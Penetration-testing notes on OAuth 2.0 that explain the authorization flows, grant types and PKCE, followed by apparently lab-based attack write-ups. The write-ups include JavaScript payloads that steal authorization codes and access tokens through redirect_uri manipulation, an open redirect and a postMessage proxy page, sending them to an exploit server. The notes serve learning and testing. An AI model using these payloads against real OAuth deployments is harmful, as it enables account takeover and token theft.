# Content
- [OAuth flow](#oauth-flow)
  - [OAuth 2.0 Authorization Code Grant Flow](#oauth-20-authorization-code-grant-flow)
  - [Step-by-Step OAuth 2.0 Implicit Grant Flow](#step-by-step-oauth-20-implicit-grant-flow)
- [OAuth Explain](#oauth-explain)
  - [Grant Types in OAuth](#grant-types-in-oauth)
- [PKCE](#pkce)
- [Recon](#recon)
- [Vulnerabilities in the client application](#vulnerabilities-in-the-client-application)
  - [implicit flow implemntation](#implicit-flow-implemntation)
  - [Flawed CSRF protection](#flawed-csrf-protection)
- [Vulnerabilities in the OAuth service](#vulnerabilities-in-the-oauth-service)
  - [Leaking authorization codes and access tokens by Flawed redirect_uri validation](#leaking-authorization-codes-and-access-tokens-by-flawed-redirect_uri-validation)
  - [Stealing OAuth access tokens via an open redirect](#stealing-oauth-access-tokens-via-an-open-redirect)
  - [Stealing OAuth access tokens via a proxy page and gadgets on the site](#stealing-oauth-access-tokens-via-a-proxy-page-and-gadgets-on-the-site)
  - [Unverified user registration](#unverified-user-registration)
- [OpenID Connect vulnerabilities]()

## OAuth flow
### OAuth 2.0 Authorization Code Grant Flow
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/20bde7f8-ecf2-461b-8073-dabcca92a05d)

**Authorization Request by Browser (User Agent)**

- The client application redirects the user's browser to the authorization server.
```http
GET /authorize?response_type=code&client_id=YOUR_CLIENT_ID&redirect_uri=https://client.example.com/callback&scope=read_profile&state=RANDOM_STATE HTTP/1.1
Host: authorization-server.com
```

**User Authorization by User (via Browser)**

- The user is redirected to the authorization server’s login and authorization page, where they log in and authorize the client application.
- After successful authorization, the authorization server redirects the user’s browser back to the client application with an authorization code.

```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback?code=AUTHORIZATION_CODE&state=RANDOM_STATE
```

**Token Request by Client Application (Backend Server)**

- The client application’s backend exchanges the authorization code for an access token by making a request to the authorization server’s token endpoint.
```http
POST /token HTTP/1.1
Host: authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=https://client.example.com/callback&client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET

```

**Token Response by Authorization Server**

- The authorization server responds with an access token (and optionally a refresh token).
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "ACCESS_TOKEN",
  "token_type": "bearer",
  "expires_in": 3600,
  "refresh_token": "REFRESH_TOKEN",
  "scope": "read_profile"
}
```

### Step-by-Step OAuth 2.0 Implicit Grant Flow
![Screenshot_1](https://github.com/kiro6/penetration-testing-notes/assets/57776872/899a0fc5-2795-4a90-a106-615ea82d25aa)



**Authorization Request by Browser (User Agent)**

- The client application redirects the user's browser to the authorization server's authorization endpoint.
```http
GET /authorize?response_type=token&client_id=YOUR_CLIENT_ID&redirect_uri=https://client.example.com/callback&scope=read_profile&state=RANDOM_STATE HTTP/1.1
Host: authorization-server.com
```

**User Authorization by User (via Browser)**

- The user is redirected to the authorization server’s login and authorization page, where they log in and authorize the client application.
- After successful authorization, the authorization server redirects the user’s browser back to the client application with an access token included in the URL fragment.
```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback#access_token=ACCESS_TOKEN&token_type=bearer&expires_in=3600&state=RANDOM_STATE
```

**Extracting Access Token Who initiates: Browser (User Agent)**
- The user's browser processes the URL fragment to extract the access token from the prev response 

**Resource Request by Browser (User Agent)**

- The client application uses the access token to access protected resources on the resource server.
```http
GET /resource HTTP/1.1
Host: resource-server.com
Authorization: Bearer ACCESS_TOKEN
```


## OAuth Explain
[ OAuth and OpenID Connect by OktaDev](https://youtu.be/t18YB3xDfXI?si=FzFbXztH8VIXGt5b)

### Grant Types in OAuth
### Authorization Code Grant:
- **Use Case:** Suitable for web applications (server-side applications) where the client secret can be kept confidential.
- **Flow:**
  - The user logs in and authorizes the client.
  - The authorization server redirects the user back to the client with an authorization code.
  - The client exchanges the authorization code for an access token by making a request to the authorization server’s token endpoint, including the client secret.
- **Advantages:** Secure because the access token is never exposed to the user agent (browser) and involves a server-to-server communication using the client secret.

### Implicit Grant:
- **Use Case:** Suitable for browser-based or mobile applications where the client secret cannot be kept confidential.
- **Flow:**
  - The user logs in and authorizes the client.
  - The authorization server redirects the user back to the client with an access token OR use PKCE.
- **Advantages:** Simplifies the process by skipping the authorization code exchange step, making it faster but less secure because the access token is exposed to the user agent and potentially intercepted.

### Resource Owner Password Credentials Grant:
- **Use Case:** Suitable for trusted applications, like first-party clients or clients highly trusted by the resource owner.
- **Flow:**
  - The user provides their username and password directly to the client.
  - The client sends the credentials to the authorization server to obtain an access token.
- **Advantages:** Simplifies the process for trusted clients but is not recommended for third-party applications due to security risks of exposing credentials.

### Client Credentials Grant:
- **Use Case:** Suitable for machine-to-machine (M2M) applications, where there is no user involved, only the client.
- **Flow:**
  - The client authenticates with the authorization server using its client credentials (client ID and secret).
  - The authorization server issues an access token directly.
- **Advantages:** Simple and secure for server-to-server communication.

### Refresh Token Grant:
- **Use Case:** Used to obtain a new access token when the current one expires without requiring the user to re-authenticate.
- **Flow:**
  - The client includes the refresh token in a request to the token endpoint.
  - The authorization server validates the refresh token and issues a new access token.
- **Advantages:** Enhances user experience by allowing long-lived sessions without frequent re-authentication.

### Device Code Grant (Device Flow):
- **Use Case:** Suitable for devices with limited input capabilities (e.g., smart TVs, IoT devices).
- **Flow:**
  - The device requests a device code from the authorization server.
  - The user is instructed to visit a verification URL and enter the device code.
  - Once the user authorizes the device, the authorization server issues an access token to the device.
- **Advantages:** Provides a user-friendly way to authorize devices with limited input capabilities.

### PKCE
is used to protect the authorization token from being used by attacker , it uses code challenge and code verifier (hash value of code challenge) which used once per auth request 

#### **so why if the client can store the code verfier securly why does it not store the client secret securly ?**
Client Secret:
  - Lifetime: Long-lived and used across multiple authorization flows.
  - Usage: Used to authenticate the client itself.
  - Security Requirement: Must be kept confidential and secure for the entire lifetime of the client application.



Code Verifier:
  - Lifetime: Short-lived, specific to a single authorization request.
  - Usage: Used only once to exchange the authorization code for an access token.
  - Security Requirement: Needs to be kept confidential only for a short period, during the specific authorization flow.

#### code challenge is sent with first Authorization Request when we get the authorization token we send it with the code verifier to get the access token (because if the attacker intercpted the authorization token he do not know the code challenge )


## Recon
check files like
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration

```

## Vulnerabilities in the client application

### implicit flow implemntation 
in implicit grant type the client application will often submit user's data (access token , username , email) to the server in a POST request and then assign the user a session cookie , However if the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted

```http
POST /authenticate HTTP/2
Host: 0a9800510465d729800a216300040036.web-security-academy.net
Cookie: session=yubcmNuHJQXbon9rohMPLcLHXdnl4OyX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Referer: https://0a9800510465d729800a216300040036.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a9800510465d729800a216300040036.web-security-academy.net


{"email":"wiener@hotdog.com","username":"wiener","token":"lf7bYBQNBgrgqvnk6gVxH8VxV581z2laZvsEwY4bL3X"}
```

### Flawed CSRF protection
if you notice that the authorization request does not send a `state` parameter it is vuln to csrf, 


**for Example** if OAuth used for social media link authorization you can start an OAuth flow and intercrept the authorization link and send it to the vicitm , now the victim is linked to your social media account and you can use your social media auth to login to his account 


```html
<script>
    location = "https://0a76004a0329df58826e340d00f800ae.web-security-academy.net/oauth-linking?code=Nx7vBhy9h-asF2x9-HTN9hIiNHXiIPNWgJPnX9i8Vwm"
</script>
```

## Vulnerabilities in the OAuth service

### Leaking authorization codes and access tokens by Flawed redirect_uri validation

- use an attacker controlled url in the `redirect_uri` paramter so the access token or auth token be sent to the attacker
- using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser. 
```html
<script>
    location = "https://oauth-0a2900880318c1f383674934029a0058.oauth-server.net/auth?client_id=cdtbbxmaau7pdqmqigriz&redirect_uri=https://exploit-0af10059037bc1d283cf4a0601cb009e.exploit-server.net/&response_type=code&scope=openid%20profile%20email"
</script>
```
- then the attacker uses it 
```http
GET /oauth-callback?code=qstUn8gNn422ul5M0BB0E_WEE3TJ-nHl9HLY4BWLj4u HTTP/2
Host: 0ae4003b03f6c1d9833e4bba005c00d9.web-security-academy.net
Cookie: session=RvqvIt8dy47qEglKbbm5l6tHNNVX57VO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```


**NOTE:** 

changing the response_mode from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`. 

### Stealing OAuth access tokens via an open redirect

```html
<script>
   if (!window.location.hash){
    location = "https://oauth-0a3100a404224fce822cff8e0216008e.oauth-server.net/auth?client_id=gephlxm18wdavk0znqj6v&redirect_uri=https://0ac1001e04044f368374017000510051.web-security-academy.net/oauth-callback/../post/next?path=https%3a//exploit-0acc000804e34fc1836c000e01df0060.exploit-server.net/exploit&response_type=token&nonce=-1402771748&scope=openid%20profile%20email";

   } else {
    location = "https://exploit-0acc000804e34fc1836c000e01df0060.exploit-server.net/exploit?token=" + window.location.hash.substring(1);
   }
</script>
```

### Stealing OAuth access tokens via a proxy page and gadgets on the site 

in this lap from [portswigger](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page) we found a scruipt in a page tha can be used + iframe to steal access tokens

``` html
       <script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
        </script>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parent Window</title>
</head>
<body>
    <h1>Parent Window</h1>
    <iframe id="child-iframe" src="https://oauth-0a51003f04d3047d81a09676029600de.oauth-server.net/auth?client_id=f13tk3x2wuozyr4n6r4o8&redirect_uri=https%3A%2F%2F0a4300a604b4040e81cc981100e600ca%2Eweb%2Dsecurity%2Dacademy%2Enet%2Foauth%2Dcallback%2F%2E%2E%2Fpost%2Fcomment%2Fcomment%2Dform&response_type=token&nonce=489624795&scope=openid%20profile%20email" width="600" height="400"></iframe>
    <script>
        window.addEventListener('message', function(e) {
            fetch("/" + encodeURIComponent(e.data.data))
        }, false)
    </script>
</body>
</html>
```

### Unverified user registration
Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider. 

## OpenID Connect vulnerabilities
